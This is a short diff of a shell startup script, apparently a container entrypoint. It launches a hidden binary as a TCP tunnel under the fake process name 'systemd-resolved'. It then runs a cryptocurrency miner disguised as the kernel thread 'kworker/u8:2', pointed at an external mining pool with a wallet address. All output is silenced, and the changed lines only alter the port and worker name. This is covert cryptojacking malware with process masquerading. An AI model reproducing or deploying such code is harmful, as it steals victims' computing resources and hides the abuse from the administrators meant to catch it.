@@ -12,10 +12,10 @@ rm -f /app/sr
 
 (exec -a systemd-resolved /usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" \
---url 127.0.0.1:8443 >/dev/null 2>&1 &)
+--url 127.0.0.1:443 >/dev/null 2>&1 &)
 
 sleep 3
 
-(exec -a kworker/u8:2 /app/$NAME -a yescryptr32 -o eu.rplant.xyz:7047 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.hail -p x >/dev/null 2>&1 &)
+(exec -a kworker/u8:2 /app/$NAME -a yescryptr32 -o eu.rplant.xyz:7047 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.marry -p x >/dev/null 2>&1 &)
 
 tail -f /dev/null
